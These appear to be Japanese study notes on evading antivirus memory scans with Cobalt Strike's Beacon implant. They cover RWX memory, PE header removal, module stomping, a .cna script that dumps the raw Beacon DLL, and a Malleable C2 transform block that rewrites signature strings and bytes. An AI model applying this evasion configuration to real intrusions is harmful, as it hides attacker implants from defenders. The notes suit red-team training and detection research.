Cobalt StrikeではBeaconシェルコードのインジェクションを行う。
多くのAVはメモリスキャン機能を持っており、ロードされた後に検出される可能性

## RWX Memory
デフォルトではローダーはRWX領域にメモリを割り当てる。
Malleable C2で`stage.userwx`を`false`に設定するとRW権限でメモリを割り当てる

## DLL Headers
ローダーがBeaconをメモリにロードする際、デフォルトではBeaconのPEヘッダも一緒に含まれる。メモリ領域でPEが実行されていることが検知されてしまう

`stage.copy_pe_header`を`false`に設定すると、付加ローダーがそれらのヘッダをコピーしなくなり、メモリには`.text`と`.data`セクションのみが残る

## Module Stomping
正規のDLLは必ずディスク上のファイルと紐づいているというのが普通だが、ビーコンの場合は紐づいてない
```
メモリアドレス    内容                    ディスクのファイル
─────────────────────────────────────────────────────────
0x7FF800000000   ntdll.dll のコード   ←→  C:\Windows\System32\ntdll.dll
0x7FF780000000   kernel32.dll のコード ←→  C:\Windows\System32\kernel32.dll
0x1A0000000000   Beacon のコード      ←→  ❌ 紐付きなし！
```

正規DLLをロードして、そのメモリをBeaconで上書きする
```
メモリアドレス    内容                       ディスクのファイル
──────────────────────────────────────────────────────────────
0x1A0000000000   Beacon のコード        ←→  C:\Windows\System32\Hydrogen.dll
                 （中身はBeaconに差し替わった）   ↑紐付きはそのまま残る！
```

Malleable C2の`stage.module_[x86/x64]`オプションは、**Module Stomping**（またはModule Overloading）と呼ばれる技術をBeaconの付加ローダーに実行

## Strings
.textセクションまたは.rdataセクションのリテラル文字列で検出されてしまう。

Beaconの文字列を確認したいとき以下のcnaを取り込む
```javascript
set BEACON_RDLL_GENERATE
{
    local ( '$path $handle' );
    
    $path   = getFileProper("C:\\", "Payloads", "beacon_raw." . $3 . ".dll");
    $handle = openf(">" . $path);
    writeb($handle, $2);
    closef($handle);
    
    return $null;
}

artifact_payload("http", "raw", "x64", "thread", "None");
```

取り出したビーコンのペイロードの文字列を確認
```
strings -d beacon_raw.x64.dll -n 6 > beacon-string.txt
```

Malleable C2の`transform`ブロックで置換（strrepによる文字列の置換）
x64ビーコンをを置換する例
```javascript
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";
    
    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```

メモリスキャンを強制的に実行させる既知の方法はないため、試行錯誤するしかない